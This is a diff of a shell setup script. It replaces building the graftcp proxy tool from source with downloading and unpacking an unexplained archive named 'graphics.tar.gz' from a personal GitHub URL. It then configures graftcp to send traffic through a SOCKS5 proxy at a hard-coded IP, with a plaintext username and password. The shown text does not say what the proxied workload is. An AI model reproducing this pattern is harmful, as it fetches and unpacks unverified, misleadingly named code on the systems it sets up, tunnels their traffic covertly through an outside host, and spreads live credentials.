@@ -9,21 +9,14 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 
-wget https://golang.org/dl/go1.16.6.linux-amd64.tar.gz
-tar -xvzf go1.16.6.linux-amd64.tar.gz
-export PATH=$PATH:~/go/bin
-source $HOME/.profile
-rm go1.16.6.linux-amd64.tar.gz
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
-git clone https://github.com/hmgle/graftcp.git
-cd graftcp
-make
-cd
+tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 13.57.39.41:1080
+socks5 = 18.216.28.28:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
